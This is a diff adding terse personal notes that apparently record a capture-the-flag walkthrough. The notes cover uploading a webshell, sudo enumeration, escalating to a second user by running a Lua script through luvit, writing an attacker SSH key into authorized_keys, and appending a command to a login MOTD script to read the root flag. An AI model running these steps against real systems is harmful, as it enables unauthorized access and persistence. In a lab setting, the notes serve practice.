@@ -1,0 +1,28 @@
+search webshells xh4h 
+try all file name
+upload file and get shell
+
+
+user: webadmin
+
+two user 
+webadmin
+sysadmin
+
+cat note.txt
+cat .bash_history
+ls -la
+sudo -l
+nano privesc.lua
+sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+rm privesc.lua
+udo -u sysadmin /home/sysadmin/luvit privesc.lua
+
+echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqYvzO4kP6mnXir1Mr+ZZwChyGcczdHx7Yb35s9IIY6iO6oYeri+vvy2YSsWszLFilDWaxZNRqylOhKbLKjsM4Lk3Lrs56VU/75zv6WPiUtpecJBg2LsmwAoh8g9PaKx2SxEW3T0lfiUDS5L4b+Hwoezz8foKj2uZkuSzcyJYH3EOh1mQ1v/DbHtyXpRLzsmTxQyYClPqbpXHlxiG3IWt8+n6vEb3/bzMZJQarWkW4jollZpC3iq/ymL3zRc4S+x9rnRF93a5zlE7tVEpsJXbdedHCAr0n9EcRFwcPx2duhDdn8ckr1dZQhO5/T9EcMFzj8ZPoyIPT8cUao3OEhP7AR+MltspoOiJ7DIZ8RGz1DC/EjwVca824ahBb+MkT3beOIB/uFZB4822QK2JqaxO2kcpSFIsKO+dDTPzHTVTwU50yEVOswaD/pL33TAGdqDxTgVDJf/DcR2hxmlKkxeTCaEAz0g+k3hA3vir1SyLoKgL4tb00aE5xbGI2i1dhEpE= mayomacam@parrot > /home/webadmin/.ssh/authorized_keys
+
+
+echo "strings /root/root.txt" >> 00-header
+
+hear we are getting only 30 seconds so make sure do ssh login in 30 second
+after that we have to update file again 
+if we login between 0 to 30 second we gonna get flag.
